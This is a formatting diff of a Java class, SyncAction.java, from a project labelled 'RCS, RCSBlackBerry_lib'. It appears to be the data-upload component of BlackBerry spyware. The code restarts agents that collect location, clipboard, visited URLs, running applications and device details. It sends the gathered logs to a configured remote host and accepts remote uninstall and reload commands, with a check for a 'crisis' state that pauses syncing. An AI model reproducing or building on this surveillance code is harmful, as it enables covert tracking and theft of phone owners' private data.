@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : SyncAction.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : SyncAction.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.action;
@@ -21,129 +21,155 @@ import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-public class SyncAction extends SubAction {
-	// #debug
-	private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
+// TODO: Auto-generated Javadoc
+/**
+ * The Class SyncAction.
+ */
+public final class SyncAction extends SubAction {
+    // #debug
+    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
 
-	LogCollector logCollector;
-	AgentManager agentManager;
-	Transfer transfer;
+    LogCollector logCollector;
+    AgentManager agentManager;
+    Transfer transfer;
 
-	boolean wifi;
-	boolean gprs;
+    boolean wifi;
+    boolean gprs;
 
-	boolean ssl = false;
+    boolean ssl = false;
 
-	String host = "";
-	int port = 80;
+    String host = "";
+    int port = 80;
 
-	boolean syncying;
+    boolean syncying;
 
-	public SyncAction(final int actionId_, final byte[] confParams) {
-		super(actionId_);
-		parse(confParams);
+    /**
+     * Instantiates a new sync action.
+     * 
+     * @param actionId_
+     *            the action id_
+     * @param confParams
+     *            the conf params
+     */
+    public SyncAction(final int actionId_, final byte[] confParams) {
+        super(actionId_);
+        parse(confParams);
 
-		// #ifdef DBC
-		Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
-		// #endif
+        // #ifdef DBC
+        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
+        // #endif
 
-		logCollector = LogCollector.getInstance();
-		agentManager = AgentManager.getInstance();
-		transfer = Transfer.getInstance();
-	}
+        logCollector = LogCollector.getInstance();
+        agentManager = AgentManager.getInstance();
+        transfer = Transfer.getInstance();
+    }
 
-	public SyncAction(final String host_) {
-		super(ACTION_SYNC);
-		this.host = host_;
-	}
+    /**
+     * Instantiates a new sync action.
+     * 
+     * @param host_
+     *            the host_
+     */
+    public SyncAction(final String host_) {
+        super(ACTION_SYNC);
+        host = host_;
+    }
 
-	public boolean execute(final Event triggeringEvent) {
-		// #debug info
-	debug.info("SyncAction execute: " + triggeringEvent);
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
+     */
+    public boolean execute(final Event triggeringEvent) {
+        // #debug info
+        debug.info("SyncAction execute: " + triggeringEvent);
 
-		synchronized (this) {
-			if (syncying) {
-				// #debug
-				debug.warn("Already syncing: skipping");
-				return true;
-			} else {
-				syncying = true;
-			}
-		}
+        synchronized (this) {
+            if (syncying) {
+                // #debug
+                debug.warn("Already syncing: skipping");
+                return true;
+            } else {
+                syncying = true;
+            }
+        }
 
-		try {
+        try {
 
-			if (statusObj.crisis()) {
-				// #debug
-				debug.warn("SyncAction - no sync, we are in crisis");
-				return false;
-			}
+            if (statusObj.crisis()) {
+                // #debug
+                debug.warn("SyncAction - no sync, we are in crisis");
+                return false;
+            }
 
-			wantReload = false;
-			wantUninstall = false;
+            wantReload = false;
+            wantUninstall = false;
 
-			// #ifdef DBC
-			Check.asserts(logCollector != null, "logCollector == null");
-			// #endif
+            // #ifdef DBC
+            Check.asserts(logCollector != null, "logCollector == null");
+            // #endif
 
-			//host = "192.168.1.177";
-			transfer.init(host, port, ssl, wifi);
+            //host = "192.168.1.177";
+            transfer.init(host, port, ssl, wifi);
 
-			// Stop degli agenti che producono un singolo log
-			agentManager.reStart(Agent.AGENT_POSITION);
-			agentManager.reStart(Agent.AGENT_APPLICATION);
-			agentManager.reStart(Agent.AGENT_CLIPBOARD);
-			agentManager.reStart(Agent.AGENT_URL);
+            // Stop degli agenti che producono un singolo log
+            agentManager.reStart(Agent.AGENT_POSITION);
+            agentManager.reStart(Agent.AGENT_APPLICATION);
+            agentManager.reStart(Agent.AGENT_CLIPBOARD);
+            agentManager.reStart(Agent.AGENT_URL);
 
-			// l'agente device si comporta diversamente
-			agentManager.reStart(Agent.AGENT_DEVICE);
+            // l'agente device si comporta diversamente
+            agentManager.reStart(Agent.AGENT_DEVICE);
 
-			Utils.sleep(2500);
+            Utils.sleep(2500);
 
-			final boolean ret = transfer.startSession();
+            final boolean ret = transfer.startSession();
 
-			this.wantUninstall = transfer.uninstall;
-			this.wantReload = transfer.reload;
+            wantUninstall = transfer.uninstall;
+            wantReload = transfer.reload;
 
-			if (ret) {
-				// #debug debug
-	debug.trace("InternetSend OK");
-				return true;
-			}
+            if (ret) {
+                // #debug debug
+                debug.trace("InternetSend OK");
+                return true;
+            }
 
-			// #debug
-			debug.error("InternetSend Unable to perform");
+            // #debug
+            debug.error("InternetSend Unable to perform");
 
-			return false;
-		} finally {
-			synchronized (this) {
-				syncying = false;
+            return false;
+        } finally {
+            synchronized (this) {
+                syncying = false;
 
-			}
-		}
-	}
+            }
+        }
+    }
 
-	protected boolean parse(final byte[] confParams) {
-		final DataBuffer databuffer = new DataBuffer(confParams, 0,
-				confParams.length, false);
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#parse(byte[])
+     */
+    protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
+                confParams.length, false);
 
-		try {
-			this.gprs = databuffer.readInt() == 1;
-			this.wifi = databuffer.readInt() == 1;
+        try {
+            gprs = databuffer.readInt() == 1;
+            wifi = databuffer.readInt() == 1;
 
-			final int len = databuffer.readInt();
-			final byte[] buffer = new byte[len];
-			databuffer.readFully(buffer);
+            final int len = databuffer.readInt();
+            final byte[] buffer = new byte[len];
+            databuffer.readFully(buffer);
 
-			host = WChar.getString(buffer, true);
+            host = WChar.getString(buffer, true);
 
-		} catch (final EOFException e) {
-			// #debug
-			debug.error("params FAILED");
-			return false;
-		}
+        } catch (final EOFException e) {
+            // #debug
+            debug.error("params FAILED");
+            return false;
+        }
 
-		return true;
-	}
+        return true;
+    }
 
 }
